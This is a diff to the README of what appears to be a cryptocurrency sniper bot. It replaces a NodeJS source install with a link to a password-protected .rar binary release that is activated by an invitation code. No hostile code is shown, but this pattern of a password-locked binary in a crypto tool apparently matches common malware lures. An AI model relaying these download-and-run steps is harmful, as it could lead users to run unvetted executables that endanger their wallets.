@@ -41,7 +41,7 @@
 ## Description
 ![Alt Text](https://i.imgur.com/X5kaYcS.png)
 
-Alchemism is a fast and efficient cryptocurrency trading bot written in NodeJS. It automates the process of buying and selling tokens on blockchain networks as soon as liquidity is added and trading is enabled.
+Alchemism is a fast and efficient cryptocurrency trading bot written in .NET Framework 4.5. It automates the process of buying and selling tokens on blockchain networks as soon as liquidity is added and trading is enabled.
 <br><br>
 The bot operates with lightning speed when connected to a reliable node, such as one from Quicknode, allowing for buy/sell transactions in under 5 seconds.
 <br><br>
@@ -101,9 +101,8 @@ The bot currently supports any token using the Uniswap interface.
 ## Getting Started
 ### Requirements
 <ul>
-    <li>Windows 10 / 11</li>
-	<li>Latest <a href="https://nodejs.org/en/download/">NodeJS</a> installed.</li>
-	<li>Latest <a href="https://git-scm.com/downloads">Git</a> installed.</li>
+    <li>Windows 7/10/11</li>
+	<li>.NET Framework 4.5 installed.</li>
 	<li>A <b>decent</b> internet connection.</li>
 	<li>
 		A <b>decent</b> BSC node, preferably paid, but free nodes are also an option.
@@ -117,17 +116,12 @@ The bot currently supports any token using the Uniswap interface.
 
 ### Installation
 
-1. Download and install NodeJS from [here](https://nodejs.org/en/download/).
-2. [Download](https://github.com/AlchemismCrypto/crypto-sniper-bot/archive/refs/heads/main.zip) this repository and extract files (you can use `git clone`). 
-4. Open a command prompt in folder with `index.js` file.
-5. In the same command prompt, install the NPM packages.
-	```sh
-	npm install
-	```
-6. In the same command prompt, run JS script.
-	```sh
-	node index.js
-	```
+Full installation guide here: [Alchemism Installation](https://alchemism.io/docs/getting-started/installation.html)
+
+1.[Download](https://github.com/AlchemismCrypto/crypto-sniper-bot/releases/download/Release/AlchemismLite-2.0.3.rar) last release of AlchemismLite.
+2. Extract the binary files using the password provided in the `README.txt` file of the archive.
+3. Run the program and enter the AlchemismLite invitation code. For the public version, invitation codes are similar to licenses.
+4. After activation the program is ready for configuration.
 
 ### Configuration
 
